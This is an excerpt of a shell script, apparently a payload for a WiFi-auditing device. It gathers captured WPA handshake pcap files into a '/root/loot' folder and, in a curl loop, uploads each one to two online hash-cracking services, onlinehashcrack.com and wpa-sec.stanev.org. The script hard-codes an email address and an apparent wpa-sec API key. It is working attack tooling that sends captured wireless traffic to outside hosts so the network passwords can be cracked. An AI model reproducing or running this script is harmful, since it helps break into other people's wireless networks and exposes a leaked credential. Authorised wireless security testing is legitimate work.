...
# transaction logs: /root/loot/handshakes/handshakeslogs
# persistent handshake loot: /root/loot/handshakes

# uncomment and cusotomize the next 2 lines to bypass the -e and -k flags
email=sheepstealing@gmail.com
wpasec_key=d4e0262b5f99af35e9c3fb1a9d2bba11
...
echo "> See /root/loot/handshakes/handshakeslogs for submission logs"
echo "> ----------------------------"
# setup our directories
if [ ! -d "/root/loot/handshakes" ]; then
  mkdir -p /root/loot/handshakes
fi
if [ ! -d "/root/loot/handshakes/handshakeslogs" ]; then
  mkdir -p /root/loot/handshakes/handshakeslogs
fi
...
cp *.pcap -au /tmp/handshakes /root/loot/handshakes/handshakes
now=$(date +%s)
while IFS= read -r line; 
  do 
    curl -X POST -F "email=${email}" -F "file=@/root/loot/handshakes/handshakes/${line}" https://api.onlinehashcrack.com; 
    echo "> Submitted ${line} to onlinehashcrack.com";
    curl -X POST -F "webfile=@/root/loot/handshakes/handshakes/${line}" --cookie "key=${wpasec_key}" https://wpa-sec.stanev.org/\?submit;
    echo "> Submitted ${line} to wpa-sec.stanev.org";
done < /tmp/ls-handshake.out >> /root/loot/handshakes/handshakeslogs/submitted-${now}.txt;

echo "Cleaning up..."
while IFS= read -r line; do mv "/tmp/handshakes/${line}" "/tmp/handshakes/submitted-${line}"; mv "/root/loot/handshakes/handshakes/${line}" "/root/loot/handshakes/handshakes/submitted-{$line}"; done < /tmp/ls-handshake.out;
rm /tmp/ls-handshake.out

echo "Output:"
cat /root/loot/handshakes/handshakes/handshakeslogs/submitted-${now}.txt
